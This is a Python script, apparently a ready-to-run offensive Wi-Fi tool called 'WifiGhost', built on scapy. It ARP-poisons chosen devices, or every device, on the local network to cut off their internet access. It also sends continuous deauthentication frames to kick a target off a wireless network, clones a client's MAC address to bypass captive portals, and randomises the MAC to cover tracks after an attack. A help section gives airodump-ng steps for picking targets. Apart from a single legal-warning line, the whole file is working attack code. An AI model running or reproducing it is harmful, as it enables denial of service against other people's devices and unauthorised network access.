
#!/usr/bin/env python
import time
import os
import sys
import subprocess
import random
import psutil
import socket
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth


'''
Code	Reason
0	Reserved
1	Unspecified Reason
2	Previous authentication is no longer valid
3	STA is leaving or has left
4	Dissociated due to inactivity
5	AP is unable to cope with all associated STAs.
6	Class 2 Frame received from nonauthenticated STA
7	Class 3 Frame received from nonassociated STA
8	Because sending STA is leaving
9	STA request is not authenticated with responding STA
10 Because Information in the Power Capability element is unacceptable. 
'''



def remote_deauth():
  interface = input("Please enter wireless interface name >")
  ap = input("Access Point mac address >")
  target = input("Target mac address >")
  pkt = RadioTap() / Dot11(addr1=target, addr2=ap, addr3=ap) / Dot11Deauth(reason=2)
  print("Press CTRL-C to stop")
  while True:
    try:
      sendp(pkt, iface=interface, verbose=False)
    except KeyboardInterrupt:
      sys.exit("Quiting")
    except OSError:
      sys.exit("Please enter an valid wireless interface")


def portal_bypass_prompt():
  ap_clients_portal()

def bypass_portal(mac):
  input("Please put your wireless interface into normal mode .Press enter to continue")
  interface= input("Please enter your wireless interface name>")
  changemac(interface,mac.lower())
  print("Now connect to the network and you should not need to use portal")
  sys.exit()


def portal_bypass_check_mac(mac):
  if mac != "FF:FF:FF:FF:FF:FF":
    bypass_portal(mac)
  else:
    pass


def ap_clients_portal():
  APs = []
  global ap_mac
  def pkt_callback(pkt):
    global ap_mac
    if pkt.haslayer(Dot11Beacon):
        bss = pkt.getlayer(Dot11).addr2.upper()
        if bss not in APs:
            APs.append(bss)
    elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2 and not pkt.haslayer(EAPOL):
        sn = pkt.getlayer(Dot11).addr2.upper()
        rc = pkt.getlayer(Dot11).addr1.upper()

        if sn in APs:
            if (sn != ap_mac):
              pass
            else:
              print ("AP (%s) > STA (%s)" % (sn, rc))
              portal_bypass_check_mac(rc)

        elif rc in APs:
            if (rc != ap_mac):
              pass
            else:
              print ("AP (%s) < STA (%s)" % (rc, sn))
              portal_bypass_check_mac(sn)
  interface = input("Wireless interface name>")
  ap_mac = input("Access Point mac address>").upper()
  sniff(iface=interface, prn=pkt_callback)






def ap_clients():
  APs = []
  APC = []
  global ap_mac
  def pkt_callback(pkt):
    global ap_mac
    if pkt.haslayer(Dot11Beacon):
        bss = pkt.getlayer(Dot11).addr2.upper()
        if bss not in APs:
            APs.append(bss)
    elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2 and not pkt.haslayer(EAPOL):
        sn = pkt.getlayer(Dot11).addr2.upper()
        rc = pkt.getlayer(Dot11).addr1.upper()

        if sn in APs:
            if (sn != ap_mac):
              pass
            else:
              if rc in APC:pass
              else:
                if rc != "FF:FF:FF:FF:FF:FF":
                  print ("AP %s | STA %s" % (sn, rc))
                  APC.append(rc)
                else:
                  pass

        elif rc in APs:
            if (rc != ap_mac):
              pass
            else:
              if sn in APC:pass
              else:
                if sn != "FF:FF:FF:FF:FF:FF":
                  print ("AP %s | STA %s" % (rc, sn))
                  APC.append(sn)
                else:
                  pass
  interface = input("Wireless interface name>")
  ap_mac = input("Access Point mac address>").upper()
  sniff(iface=interface, prn=pkt_callback)



def more_info():
  print("""How to use Poison Option:
  Poison option is very simle .
  First you should see a menu like this:

  Found Devices:
  0)	10.1.1.1	a4:91:b1:f7:57:83	router.lan
  1)	10.1.1.62	e4:ce:8f:51:a5:c7	Imac.lan
  2)	10.1.1.143	5c:f7:e6:4c:33:f6	iPad.lan
  3)	10.1.1.239	d0:df:9a:70:47:77	DESKTOP.lan
  --------------------
  then enter a number that you want.
  Im going to attack 10.1.1.143 so i will enter 2.
  Then it should attack it.

How to use remote deauth:
  remote deauth is very good for taking down devices on remote networks.

  first put your wireless interface into monitor mode.
  sudo airmon-ng start (wireless interface name)

  then find the mac address of access point.
  sudo airodump-ng (name of wireless interface)

  then find the mac address of target
  sudo airodump-ng -c (channel of wifi) --bssid (mac address of access point) (name of wireless interface)
  
  then enter this all in and it should kick the device of the network.
  This way is much more effective because it will completly kick them of the network, but the other just stops them from .
  
Access Points:
  Your wireless interface must be in monitor mode.
  Just displays access points.
  """)






























class colors: 
    reset='\033[0m'
    bold='\033[01m'
    disable='\033[02m'
    underline='\033[04m'
    reverse='\033[07m'
    strikethrough='\033[09m'
    invisible='\033[08m'
    class fg: 
        black='\033[30m'
        red='\033[31m'
        green='\033[32m'
        orange='\033[33m'
        blue='\033[34m'
        purple='\033[35m'
        cyan='\033[36m'
        lightgrey='\033[37m'
        darkgrey='\033[90m'
        lightred='\033[91m'
        lightgreen='\033[92m'
        yellow='\033[93m'
        lightblue='\033[94m'
        pink='\033[95m'
        lightcyan='\033[96m'
    class bg: 
        black='\033[40m'
        red='\033[41m'
        green='\033[42m'
        orange='\033[43m'
        blue='\033[44m'
        purple='\033[45m'
        cyan='\033[46m'
        lightgrey='\033[47m'
  

















def ip_macs_working(ip):
    target_ip = ip
    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    result = srp(packet, timeout=3, verbose=0)[0]

    clients = []
    res = []

    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
        res.append((received.psrc, received.hwsrc))
    return res


def poison(victim_ip, victim_mac, gateway_ip):
  packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
  send(packet, verbose=0)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
  packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
  send(packet, verbose=0)

def get_lan_ip():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(("google.com", 80))
  ip = s.getsockname()
  s.close()
  return ip[0]

def printdiv():
  print ('--------------------')


def main():
    refreshing = True
    gateway_mac = '12:34:56:78:9A:BC' # A default (bad) gateway mac address 
    while refreshing:
      myip = get_lan_ip()
      ip_list = myip.split('.')  
      del ip_list[-1]
      ip_list.append('1')
      gateway_ip = '.'.join(ip_list)

      ip_range = gateway_ip.split(".")
      ip_range[len(ip_range) - 1]+= "/24"
      ip_range = '.'.join(ip_range)

      devices = ip_macs_working(ip_range)
      printdiv()
      print ("Found Devices:")
      i = 0
      for device in devices:
        print ('%s)\t%s\t%s\t%s' % (colors.fg.lightred+str(i)+colors.reset, colors.fg.lightcyan+ str(device[0])+colors.reset, colors.fg.yellow+ str(device[1])+colors.reset, colors.fg.pink+ str(socket.getfqdn(device[0]))+colors.reset ) )
        if device[0] == gateway_ip:
          gateway_mac = device[1]
        i+=1

      printdiv()
      print ('Gateway ip:  %s' % gateway_ip)
      if gateway_mac != '12:34:56:78:9A:BC':
        print ("Gateway mac: %s" % gateway_mac)
      else:
        print ('Gateway not found. Script will be UNABLE TO RESTORE WIFI once shutdown is over')
      printdiv()
    
      # Get a choice and keep prompting until we get a valid letter or a number
      # that is in range
      print ("Who do you want to boot?")
      print ("(r - Refresh, a - Kill all, q - quit)")

      input_is_valid = False
      killall = False
      while not input_is_valid:
        choice = input(">")
        if choice.isdigit():
          # If we have a number, see if it's in the range of choices
          if int(choice) < len(devices) and int(choice) >= 0:
            refreshing = False
            input_is_valid = True
        elif choice == 'a':
          # If we have an a, set the flag to kill everything
          killall = True
          input_is_valid = True
          refreshing = False
        elif choice == 'r':
          # If we have an r, say we have a valid input but let everything
          # refresh again
          input_is_valid = True
        elif choice == 'q':
          # If we have a q, just quit. No cleanup required
          exit()
      
        if not input_is_valid:
          print ('Please enter a valid choice')

    # Once we have a valid choice, we decide what we're going to do with it
    if choice.isdigit():
      # If we have a number, loop the poison function until we get a
      # keyboard inturrupt (ctl-c)
      choice = int(choice)
      victim = devices[choice]
      print ("Preventing %s from accessing the internet..." % victim[0])
      try:
        while True:
          poison(victim[0], victim[1], gateway_ip)
      except KeyboardInterrupt:
          restore(victim[0], victim[1], gateway_ip, gateway_mac)
          print ('\nPlease Wait while I scan again ...')
    elif killall:
      print("Preventing all devices from list from accessing the internet...")
      # If we are going to kill everything, loop the poison function until we
      # we get a keyboard inturrupt (ctl-c)
      try:
        while True:
          for victim in devices:
            poison(victim[0], victim[1], gateway_ip)
      except KeyboardInterrupt:
        for victim in devices:
          restore(victim[0], victim[1], gateway_ip, gateway_mac)
        print ('\nPlease Wait while I scan again ...')
    main()

def access_points():
  interface = input("Wireless Interface name>")
  ap_list = []
  def PacketHandler (pkt) :
      if pkt.haslayer (Dot11) :
          if pkt.type == 0 and pkt.subtype == 8 :
              if pkt.addr2 not in ap_list :
                  ap_list.append(pkt.addr2)
                  print ("%s\t\t%s " %(pkt.info.decode("utf-8"), pkt.addr2))
  sniff(iface = interface , prn = PacketHandler)



banner= """ _    _ _  __ _ _____ _               _   
| |  | (_)/ _(_)  __ \ |             | |  
| |  | |_| |_ _| |  \/ |__   ___  ___| |_ 
| |/\| | |  _| | | __| '_ \ / _ \/ __| __|
\  /\  / | | | | |_\ \ | | | (_) \__ \ |_ 
 \/  \/|_|_| |_|\____/_| |_|\___/|___/\__|
                                          
"""
print(banner)
# Check for root

if os.geteuid() != 0:
  print ("You need to run the script as a superuser")
  exit()

def check_interface(interface):
    interface_addrs = psutil.net_if_addrs().get(interface) or []
    return socket.AF_INET in [snicaddr.family for snicaddr in interface_addrs]

def changemac(interface,mac):
  subprocess.run(["ifconfig", interface, "down"])
  subprocess.run(["ifconfig", interface ,"hw", "ether", mac])
  subprocess.run(["ifconfig", interface,"up"])
  print("Now your mac address",mac)


def random_mac():
  return "%02x:%02x:%02x:%02x:%02x:%02x" % (
                            random.randint(0, 255),
                             random.randint(0, 255),
                             random.randint(0, 255), 
                             random.randint(0,255),
                            random.randint(0,255),
                            random.randint(0,255))
def changemac_prompt():
  interface = input("interface name>")
  if check_interface(interface):
    changemac(interface,random_mac())
  else:
    print("This interface does not exist")


print(colors.fg.red+f"Warning: It is illegle to kick people of a network if you don't own it or if you do not have premission{colors.reset}")










print("""
1) Poison Device - only works if connected to network
2) Remote Deauth - Your wireless interface has to be in monitor mode
3) Access Points - Your wireless interface has to be in monitor mode
4) AP clients - Your wireless interface has to be in monitor mode
5) Change Mac Address - Suggested after attacking devices or network. It will radomize the mac address for extra security.
6) Wifi Portal Bypass - Your wireless interface has to be in monitor mode
7) More info""")

option = input(">")
if option == "1":
  main()
elif option == "2":
  remote_deauth()
elif option == "3":
  access_points()
elif option == "4":
  ap_clients()
elif option == "5":
  changemac_prompt()
elif option == "6":
  portal_bypass_prompt()
elif option == "7":
  more_info()
else:
  print("Not a option! quiting")